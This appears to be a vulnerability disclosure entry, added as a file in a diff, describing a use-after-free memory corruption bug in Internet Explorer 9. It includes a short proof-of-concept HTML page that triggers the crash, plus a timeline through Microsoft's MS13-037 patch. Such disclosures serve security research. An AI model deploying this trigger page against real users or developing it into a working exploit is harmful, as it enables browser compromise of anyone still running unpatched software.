@@ -1,0 +1,61 @@
+<!--
+Source: http://blog.skylined.nl/20161207001.html
+
+Synopsis
+
+A specially crafted web-page can trigger a memory corruption vulnerability in Microsoft Internet Explorer 9. I did not investigate this vulnerability thoroughly, so I cannot speculate on the potential impact or exploitability.
+
+Known affected software and attack vectors
+
+Microsoft Internet Explorer 9
+
+An attacker would need to get a target user to open a specially crafted web-page. Java­Script does not appear to be required for an attacker to triggering the vulnerable code path.
+
+Details
+
+This bug was found back when I had very little knowledge and tools to do analysis on use-after-free bugs, so I have no details to share. The ZDI did do a more thorough analysis and provide some details in their advisory. I have included a number of reports created using a predecessor of Bug­Id below.
+
+Repro.html:
+-->
+
+<!doctype html>
+<html>
+  <head>
+    <script>
+      window.onload=function(){location.reload();};
+    </script>
+  </head>
+  <body>
+    <var>
+      <img class="float" ismap="ismap" usemap="map"/>
+      <map id="map"><area/></map>
+      <dfn class="float"></dfn>
+      <a class="float"></a>
+      <input class="zoom"/>
+      text
+    </var>
+    <q class="border float zoom" xml:space="preserve">  </q>
+  </body>
+  <style type="text/css">
+  .float {
+    float:left;
+  }
+  .zoom {
+    zoom:3000%;
+  }
+  .border::first-letter {
+    border-top:1px;
+  }
+  </style>
+</html>
+
+<!--
+Time-line
+
+1 November 2012: This vulnerability was found through fuzzing.
+2 November 2012: This vulnerability was submitted to ZDI.
+19 November 2012: This vulnerability was acquired by ZDI.
+4 February 2013: This vulnerability was disclosed to Microsoft by ZDI.
+29 May 2013: Microsoft addresses this vulnerability in MS13-037.
+7 December 2016: Details of this vulnerability are released.
+-->
